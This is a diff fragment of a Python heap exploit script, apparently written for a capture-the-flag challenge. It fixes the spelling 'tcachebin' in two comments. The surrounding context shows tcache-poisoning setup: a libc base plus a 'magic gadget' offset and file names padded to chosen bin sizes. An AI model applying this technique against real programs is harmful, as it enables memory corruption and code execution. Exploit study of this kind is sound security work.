@@ -102,7 +102,7 @@ if __name__ == "__main__":
     magic_gadget = libc_base + 0x10a41c
 
 
-    ## Create a file with fname length of our chosen tcachebin size (0x40)
+    ## Create a file with fname length of our chosen tcache bin size (0x40)
     #   - set file size to something else (0x20)
     fname = fname_prefix
     fname += 'A'*(0x40 - len(fname) - 0x10)
@@ -124,7 +124,7 @@ if __name__ == "__main__":
     do_copy(fname, fname1)
 
 
-    ## Create a new file with its file size to match the tcachebin size (0x40)
+    ## Create a new file with its file size to match the tcache bin size (0x40)
     #   - set fname size to be in some other bin (0x80)
     fname2 = fname_prefix
     fname2 += 'F'*(0x80-len(fname2) - 0x10)
